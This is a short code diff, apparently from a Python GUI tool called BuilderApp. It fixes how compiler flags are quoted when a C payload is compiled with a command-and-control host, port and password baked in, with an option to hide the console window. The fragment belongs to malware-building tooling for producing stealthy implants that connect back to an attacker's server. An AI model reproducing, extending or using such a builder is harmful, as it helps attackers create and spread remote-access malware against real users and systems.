@@ -225,9 +225,9 @@ class BuilderApp:
                 return
             cfg = self._get_cfg()
             args = [cc, "-O2", "-s", "-o", out_exe, c_path,
-                    f'-DC2_HOST=\\"{cfg["host"]}\\"',
+                    f'-DC2_HOST="{cfg["host"]}"',
                     f'-DC2_PORT={cfg["port"]}',
-                    f'-DC2_PASS=\\"{cfg["password"]}\\"']
+                    f'-DC2_PASS="{cfg["password"]}"']
             if self.var_noconsole.get(): args.append("-mwindows")
             self._log(f"[*] Compiling with {cc}...")
             p = subprocess.run(args, capture_output=True, text=True, timeout=60)
